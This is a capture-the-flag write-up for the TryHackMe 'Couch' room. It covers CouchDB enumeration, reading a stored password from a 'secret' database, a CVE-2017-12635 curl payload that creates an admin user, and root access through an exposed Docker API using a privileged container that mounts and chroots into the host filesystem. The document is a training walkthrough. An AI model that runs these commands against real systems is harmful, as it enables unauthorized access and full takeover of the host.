---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Couch
# DESCRIPTION       . Hack into a vulnerable database server that collects and stores data in JSON-based document formats, in this semi-guided challenge.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/couch
```

```
sudo nmap -sSVC -T5 -Pn -p- 10.10.46.174 -oN couch 
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 349d390934304b3da71edfeba3b0e5aa (RSA)
|   256 a42eef3a845d211bb9d42613a52ddf19 (ECDSA)
|_  256 e16d4dfdc8008e86c2132dc7ad85139c (ED25519)

5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### PORT 5984 

 - Navigating to the webserver, we get the following answer

```
{"couchdb":"Welcome","uuid":"ef680bb740692240059420b2c17db8f3","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}
```

- With not too much information, I've decided to fuzz for directories.

```
ffuf -u http://10.10.46.174:5984/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 
```

```
secret                  [Status: 200, Size: 229, Words: 1, Lines: 2]
couch                   [Status: 200, Size: 228, Words: 1, Lines: 2]
_log                    [Status: 200, Size: 1000, Words: 139, Lines: 11]
```

- Okay. Navigating to any of the first two endpoints, we get a similar result

```
{"db_name":"secret","doc_count":1,"doc_del_count":0,"update_seq":2,"purge_seq":0,"compact_running":false,"disk_size":8287,"data_size":339,"instance_start_time":"1705796027027560","disk_format_version":6,"committed_update_seq":2}


{"db_name":"couch","doc_count":1,"doc_del_count":0,"update_seq":2,"purge_seq":0,"compact_running":false,"disk_size":8287,"data_size":316,"instance_start_time":"1705796909439680","disk_format_version":6,"committed_update_seq":2}
```

- The third endpoint outputs the last 11 log entries for the CouchDB service.

___

- I took a break to read about CouchDB and here's what I found.

- We can list the existing databases on the server using the following curl command (or by navigating to that endpoint):

```
curl -X GET http://10.10.46.174:5984/_all_dbs
```

```
["_replicator","_users","couch","secret","test_suite_db","test_suite_db2"]
```

- And we got back a list of databases. Obviously, I'm mostly curious about `secret`.

- We can list documents from within that database and read a document with the following commands

**** LIST DOCUMENTS

```
curl -X GET http://10.10.46.174:5984/secret/_all_docs
```

```
{"total_rows":1,"offset":0,"rows":[
{"id":"a1320dd69fb4570d0a3d26df4e000be7","key":"a1320dd69fb4570d0a3d26df4e000be7","value":{"rev":"2-57b28bd986d343cacd9cb3fca0b20c46"}}
]}
```

**** READ DOCUMENTS

```
curl -X GET http://10.10.46.174:5984/secret/a1320dd69fb4570d0a3d26df4e000be7
```

```
{"_id":"a1320dd69fb4570d0a3d26df4e000be7","_rev":"2-57b28bd986d343cacd9cb3fca0b20c46","passwordbackup":"atena:t{REDACTED}##"}
```

___ 

#### EXTRA

- Fauxton allows for visual representation of CouchDB and is installed on the server.
- Fauxton is available at `http://10.10.46.174:5984/_utils`

___

- Everyone is admin --- see bottom right corner. 
- Setup a local admin account so we have the `Signup` or `Login` options.

- This version of CouchDB is vulnerable to [CVE-2017-12635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635) which allows us to add a custom admin user.

```
curl -X PUT -d '{"type":"user","name":"myusername","roles":["_admin"],"roles":[],"password":"mypassword"}' ip:5984/_users/org.couchdb.user:myusername -H "Content-Type:application/json"
```

- The following curl command would add the `myusername:mypassword` account with admin rights.

- This could've been used to bypass authentication (actually, we don't bypass it, but we don't need to know existing credentials --- You know what I mean) if `curl -X GET http://10.10.46.174:5984/_all_dbs` would've asked for credentials --- by responding with `401 unauthorised`.

- The format for that would be `curl -X GET http://myusername:mypassword@IP:5984/_all_dbs`. 

- But to see that the user was added, you can authenticate now using `myusername:mypassword`.

- Useless for this CTF, but good to know to get a better understanding of how CouchDB is working and potential vulnerabilities.

___
#### PORT 22

- The first flag is in `/home/atena/user.txt`.

- The user `atena` can't run anything as `sudo`.

- During enumeration, I decided to take a look in `/home/atena/.bash_history` file

- I found the following, no idea if this was the intented way of doing it. (probably not, it's the history since the couchDB was downloaded/configured on the server.)

```
{...}
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
{...}
```

- It seems we have a docker container running. This can be confirmed by the fact that `docker` command is available (however, we're not able to run docker commands).

- I've used the following command to access the container

```
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine chroot /mnt /bin/sh
```

- The last flag is in `/root/root.txt`.

- The intended way was to probably identify the custom port using netstat.

```
netstat -tulpn
```

```
...
tcp        0      0 localhost:2375          *:*                     LISTEN      -        
...
```

- Then, we could've used SSH to port-forward this.

```
ssh -L 1234:127.0.0.1:2375 atena@10.10.46.174
```

- This would make the whatever service (supposing we didn't knew yet it was a docker container) was running on `2375` available on our host at `127.0.0.1:1234`.

- Next, we could use `nmap` to get a footprint of the running service

```
PORT     STATE SERVICE VERSION
1234/tcp open  docker  Docker 18.09.7 (API 1.39)
| docker-version: 
|   ApiVersion: 1.39
|   Version: 18.09.7
|   GoVersion: go1.10.4
|   MinAPIVersion: 1.12
|   Platform: 
|     Name: 
|   Components: 
|     
|       Version: 18.09.7
|       Details: 
|         ApiVersion: 1.39
|         GoVersion: go1.10.4
|         Arch: amd64
|         GitCommit: 2d0083d
|         Os: linux
|         BuildTime: 2020-10-14T17:25:58.000000000+00:00
|         MinAPIVersion: 1.12
|         KernelVersion: 4.4.0-193-generic
|         Experimental: false
|       Name: Engine
|   KernelVersion: 4.4.0-193-generic
|   BuildTime: 2020-10-14T17:25:58.000000000+00:00
|   Arch: amd64
|   Os: linux
|_  GitCommit: 2d0083d
Service Info: OS: linux
```

- And then, we could use the same command as above.

```
pi@raspberry:~ $ docker -H 127.0.0.1:1234 run --rm -it --privileged --net=host -v /:/mnt alpine chroot /mnt /bin/sh
```